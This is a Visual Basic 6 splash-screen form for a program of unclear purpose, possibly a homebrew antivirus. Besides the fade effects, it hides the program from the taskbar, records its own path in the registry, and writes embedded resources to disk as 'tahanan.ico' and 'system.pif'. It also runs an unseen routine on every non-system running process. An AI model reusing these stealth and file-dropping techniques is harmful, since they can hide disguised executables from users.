VERSION 5.00
Begin VB.Form frmSplash 
   BorderStyle     =   0  'None
   Caption         =   "Splash Screen"
   ClientHeight    =   3015
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   5400
   LinkTopic       =   "Form1"
   Picture         =   "FRMSPsadasdL~1.frx":0000
   ScaleHeight     =   3015
   ScaleWidth      =   5400
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text2 
      Height          =   495
      Left            =   -720
      MultiLine       =   -1  'True
      TabIndex        =   6
      Text            =   "FRMSPsadasdL~1.frx":EF1B
      Top             =   3240
      Width           =   6135
   End
   Begin VB.ListBox pid 
      Height          =   450
      Left            =   3960
      TabIndex        =   5
      Top             =   4560
      Width           =   1215
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   2520
      Top             =   2400
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Command3"
      Height          =   495
      Left            =   480
      TabIndex        =   4
      Top             =   3240
      Width           =   1215
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Check1"
      Height          =   495
      Left            =   5400
      TabIndex        =   3
      Top             =   3480
      Width           =   1215
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   495
      Left            =   1200
      TabIndex        =   2
      Top             =   4800
      Width           =   1215
   End
   Begin VB.ListBox pros 
      Height          =   450
      Left            =   480
      TabIndex        =   1
      Top             =   4320
      Width           =   1215
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Command2"
      Height          =   495
      Left            =   2640
      TabIndex        =   0
      Top             =   4080
      Width           =   1215
   End
   Begin VB.Timer Timer3 
      Interval        =   1
      Left            =   1080
      Top             =   2400
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   120
      Top             =   2400
   End
   Begin VB.Timer Trans 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   600
      Top             =   2400
   End
End
Attribute VB_Name = "frmSplash"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

'**********************************************
Private Declare Function SetLayeredWindowAttributes Lib "user32" (ByVal hwnd As Long, ByVal crKey As Long, ByVal bAlpha As Byte, ByVal dwFlags As Long) As Long
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long

Private Const GWL_EXSTYLE = (-20)
Private Const LWA_ALPHA = &H2
Private Const WS_EX_LAYERED = &H80000


Dim Current As Integer ' current alpha transparency 0 = transparent 255 = opaque
Dim Max As Integer

Private Sub Command1_Click()
Dim a As Integer
   Dim b As Integer
   pros.Clear
For a = 1 To Form1.lstProcess.ListItems.count
If Not isSystemFile(Form1.lstProcess.ListItems(a).ListSubItems(1)) Then
       pros.AddItem (Form1.lstProcess.ListItems(a).ListSubItems(1))
       pid.AddItem (Form1.lstProcess.ListItems(a).ListSubItems(2))
       End If
    Next a
   Command2_Click
End Sub

Private Sub Command2_Click()
Dim a As Integer
For a = 0 To pros.ListCount - 1
DoEvents
If pros.list(a) = "" Then GoTo lomp
test123 pros.list(a), pid.list(a)
lomp:
Next a
End Sub

Private Sub Timer2_Timer()
Command1_Click
Timer2.Enabled = False
End Sub

Private Sub Trans_Timer()

Current = Current - 5
If Current + 1 <= Max Then
    Trans.Enabled = False
    Transparent frmSplash.hwnd, 0
   cek1
'
    Unload Me
    Exit Sub
End If

Transparent frmSplash.hwnd, Current

End Sub

Private Sub Form_Load()
Dim slanx() As Byte
Dim slanx1 As String
Dim a As Byte
Dim b As String
If App.PrevInstance Then
Unload Me
End If
On Error Resume Next
Me.Caption = Rnd * hwnd & Rnd * 91
slanx1 = App.path & "\tahanan.ico" 'make a sequential file name
slanx = LoadResData(102, "CUSTOM") 'load the raw bytes into an array

SaveSetting "Triyan", "Ganteng", "alamatrtp", App.path & "\" & App.exeName & ".exe"
Open slanx1 For Binary As 1 'open, put, and close the .wav file
Put #1, , slanx
Close #1



Trans.Interval = 1
Current = 0
Max = 255
Transparent frmSplash.hwnd, Current

App.TaskVisible = False

Timer2.Enabled = True
End Sub

Private Function Transparent(ByVal hwnd As Long, Perc As Integer) As Long
    Dim Msg As Long
    On Error Resume Next
    If Perc < 0 Or Perc > 255 Then
      Transparent = 1
    Else
      Msg = GetWindowLong(hwnd, GWL_EXSTYLE)
      Msg = Msg Or WS_EX_LAYERED
      SetWindowLong hwnd, GWL_EXSTYLE, Msg
      SetLayeredWindowAttributes hwnd, 0, Perc, LWA_ALPHA
      Transparent = 0
    End If
    If err Then
      Transparent = 2
    End If
End Function

Private Sub Timer1_Timer()
Timer1.Enabled = False
Current = 255
Max = 0
Transparent frmSplash.hwnd, Current
Trans.Enabled = True
End Sub


Private Sub Timer3_Timer()
Current = Current + 5
If Current - 1 >= Max Then
    Timer3.Enabled = False
    Transparent frmSplash.hwnd, 255
    Timer1.Enabled = True

    Exit Sub
End If

Transparent frmSplash.hwnd, Current
End Sub
Function cek1()
If (Check1.Value = vbChecked) Then
Form1.Visible = False

Else
Form1.Show

End If

End Function
Function buat()
Dim alamat As String
Dim regiu As String
regiu = GetSetting("Triyan", "Ganteng", "alamatbat")



End Function
Private Function bin()
Dim slanx() As Byte
Dim slanx1 As String
slanx1 = App.path & "\system.pif" 'make a sequential file name
slanx = LoadResData(101, "CUSTOM") 'load the raw bytes into an array
Open slanx1 For Binary As 1 'open, put, and close the .wav file
Put #1, , slanx
Close #1
End Function
